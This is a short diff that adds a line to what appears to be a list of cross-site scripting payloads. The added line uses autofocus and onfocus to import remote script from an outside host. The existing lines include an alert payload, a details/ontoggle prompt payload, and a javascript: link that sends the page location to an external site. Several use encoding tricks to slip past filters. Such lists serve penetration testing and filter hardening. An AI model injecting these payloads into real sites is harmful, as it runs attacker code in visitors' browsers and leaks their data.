@@ -1,3 +1,4 @@
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 "%3balert`1`%3b"
 "><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
